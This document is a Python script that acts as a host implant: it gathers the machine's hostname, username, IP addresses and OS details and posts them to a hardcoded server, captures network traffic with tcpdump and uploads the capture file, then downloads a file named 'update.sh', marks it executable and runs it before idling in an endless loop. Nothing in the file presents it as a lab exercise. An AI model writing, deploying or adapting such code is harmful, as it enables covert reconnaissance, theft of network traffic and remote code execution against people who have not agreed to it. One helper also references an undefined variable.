import socket
import os
import platform
import subprocess
import requests
import time
import json
import threading

SERVER_URL = "http://192.168.2.3:8000"

def upload_file_using_requests(fname):
    try:
        response = requests.post(f"{SERVER_URL}/{fname}")
        if response.status_code == 200:
            print("File Successfully Uploaded.")
        else:
            print(f"Failed to upload: {response.status_code}")
    except Exception as e:
        print(f"Error uploading system info: {e}")
        
def upload_file_using_curl(fname):
    # curl -X POST --data-binary @read1.pcap http://192.168.2.7:8000/read1.pcap
    print(f"Uploading: {fname}")
    try:
        cmd = ["curl", "-X", "POST", "--data-binary", f"@{fname}", f"{SERVER_URL}/{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        print(process.stdout)
    except Exception as e:
        print(f"Error uploading filed: {e}")
        
def upload_json_using_requests(dictionary, fname):
    # Upload system info as JSON to the server

    try:
        response = requests.post(f"{SERVER_URL}/{fname}", json=info)
        if response.status_code == 200:
            print("Json uploaded successfully.")
        else:
            print(f"Failed to upload json: {response.status_code}")
    except Exception as e:
        print(f"Error uploading system info: {e}") 
    
def upload_json_using_curl(dictionary,fname):
    # curl -X POST --data-binary @read1.pcap http://192.168.2.7:8000/read1.pcap
    print(f"Uploading json to {fname}")
    json_data = json.dumps(dictionary, indent=4)
    try:
        cmd = ["curl", 
                "--header", "Content-Type: application/json", 
                "--request", "POST",
                "--data", f"{json_data}",
                f"{SERVER_URL}/sys_info.json"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        print(process.stdout)
        
    except Exception as e:
        print(f"Error uploading filed: {e}")

def download_using_curl(fname,fpath="./"):
    # curl http://192.168.2.7:8000/test.txt -o test.txt
    print(f"Downloading: {fname}")
    try:
        cmd = ["curl", 
                f"{SERVER_URL}/{fname}", 
                "-o", f"{fpath}{fname}"]
        # print(f"Executing: {' '.join(cmd)}")
        process = subprocess.run(cmd, capture_output=True, text=True)
        print(process.stdout)
    except Exception as e:
        print(f"Error uploading filed: {e}")

def get_ip_addresses():
    """Collect all IPv4 addresses from network interfaces."""
    try:
        output = subprocess.check_output(["ip", "addr", "show"], text=True)
        ip_addresses = []
        for line in output.splitlines():
            if "inet " in line and "inet6" not in line:  # IPv4 only
                parts = line.split()
                ip = parts[1].split("/")[0]
                ip_addresses.append(ip)
        return ip_addresses
    except Exception as e:
        print(f"Error getting IP addresses on Linux: {e}")
        return []
    
def upload_system_info():
    # Collect system information
    hostname = socket.gethostname()
    
    try:
        username = os.getlogin()
    except:
        username = os.environ.get("USER", "unknown")

    try:
        try:
            operating_system = os.uname()
        except:
            operating_system = platform.system()
    except Exception as e:
        operating_system = f"Unable to retrieve OS Info: {e}"

    ip_addresses = get_ip_addresses()
    
    # Package system info into a dictionary
    timestamp = time.strftime("%Y-%m-%d_%H:%M:%S")
    
    info = {
        "hostname": hostname,
        "username": username,
        "ip_addresses": ip_addresses,
        "timestamp": timestamp,
        "operating_system": operating_system
    }
    
    try:
        upload_json_using_curl(info,"system_info.json")
    except Exception as e:
        print(f"Error uploading system info: {e}") 

def upload_TCP_dump(fname="read.pcap",count=100):
    cmd = ["tcpdump", "-c", str(count), "-w", fname]
    try:
        process = subprocess.run(cmd, capture_output=True, text=True)
        if process.returncode == 0:
            print("tcpdump capture completed.")
            # Upload the capture file to the server
            try:     
                upload_file_using_curl(fname)
            except Exception as e:
                print(f"Error uploading capture file: {e}") 
                
        else:
            print(f"tcpdump failed with return code {process.returncode}")
            print(process.stderr)
            
    except Exception as e:
        print(f"Error running tcpdump: {e}")

def download_and_run_subprocess(fname):
    try:
        download_using_curl(fname)
        
        cmd = ["chmod", "+x", fname]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        cmd = [f"./{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        print(process.stdout)
        
    except Exception as e:
        print(f"Download and Run Failed: {e}")
        
def main():
    
    try:
        upload_system_info()
    except Exception as e:
        print(f"System Info Upload Failed: {e}")
    

    count = 10000
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y-%m-%d_%H:%M:%S")
    filename = f"{hostname}_{timestamp}.pcap"  
    print(f"Running TCP Dump Thread: Capturing {count} packets")
    
    try:
        tcp_thread = threading.Thread(target=upload_TCP_dump,args=(filename,count))
        tcp_thread.start()
    except Exception as e:
        print(f"TCP Dump Failed: {e}")
    
    
    fname = "update.sh"
    try:
        download_and_run_subprocess(fname)
    except Exception as e:
        print(f"Error in Downloading and Running {fname}: {e}")
        
    while(True):
        time.sleep(30)

if __name__ == "__main__":
    main()